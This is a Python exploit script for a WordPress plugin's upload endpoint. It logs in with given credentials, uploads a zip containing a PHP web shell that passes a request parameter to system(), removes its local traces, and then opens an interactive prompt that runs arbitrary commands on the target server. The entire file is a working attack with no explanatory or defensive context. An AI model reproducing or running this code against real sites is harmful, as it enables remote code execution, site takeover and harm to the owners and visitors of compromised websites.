import requests
import json
import urllib
import os
import sys

if(len(sys.argv) < 4):
    print("Use: python2 "+sys.argv[0]+" ip username password")
    print("Example: python2 "+sys.argv[0]+" 127.0.0.1 admin admin")


ip = sys.argv[1].strip()
user = sys.argv[2].strip()
password = sys.argv[3].strip()

#create rev.zip
#==============================================================

os.system('echo \'<html>revshell</html>\' > index.html')
os.system('echo \'<?php system($_GET["command"]);?>\' > index.php')
os.system("zip shell.zip index.html index.php")

#Login in wordpress
#===============================================================

url_login = "http://"+ip+"/wp-login.php"
s = requests.Session()

headers_login = {
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://"+ip+"",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Referer": "http://"+ip+"/wp-login.php",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "close"
}

data = "log="+user+"&pwd="+password+"&wp-submit=Log+In&redirect_to=http%3A%2F%2F"+ip+"%2Fwp-admin%2F&testcookie=1"

login_wp = s.post(url=url_login, headers=headers_login, data=data)

#upload file
#================================================================

url_upload = "http://"+ip+"/index.php/wp-json/articulate/v1/upload-data"
headers_upload = {
    "Content-Length": "1024",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarysKnNfBxBPGrZ9A4D",
    "Accept": "*/*",
    "Origin": "http://"+ip+"",
    "Referer": "http://"+ip+"/wp-admin/post-new.php",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "close"
}

file = open('shell.zip','rb')

data = '''
------WebKitFormBoundarysKnNfBxBPGrZ9A4D
Content-Disposition: form-data; name="name"

shell.zip
------WebKitFormBoundarysKnNfBxBPGrZ9A4D
Content-Disposition: form-data; name="chunk"

0
------WebKitFormBoundarysKnNfBxBPGrZ9A4D
Content-Disposition: form-data; name="chunks"

1
------WebKitFormBoundarysKnNfBxBPGrZ9A4D
Content-Disposition: form-data; name="file"; filename="shell.zip"
Content-Type: application/x-zip-compressed

''' + str(file.read()) + '''

------WebKitFormBoundarysKnNfBxBPGrZ9A4D--
'''

upload_file = s.post(url=url_upload, headers=headers_upload, data=data)

json_response = upload_file.text
obj = json.loads(json_response)

# deleting zip files
#===========================================================================
os.system('rm -rf index.html index.php shell.zip')

# request to webshell :)
#===========================================================================

url_web_shell = "http://"+ip+"" + obj['path'].replace('index.html','index.php?command=')
web_shell = s.get(url=(url_web_shell + "whoami"))

if(len(web_shell.text) != 0):
    print("I Got a web shell '-'\n")
else:
    print("ERROR :(")

while True:
    command_input = raw_input('CMD: ')

    if(command_input == 'exit'):
        exit()

    url_shell = url_web_shell + urllib.quote_plus(command_input)
    r = s.get(url=url_shell)
    print(r.text)
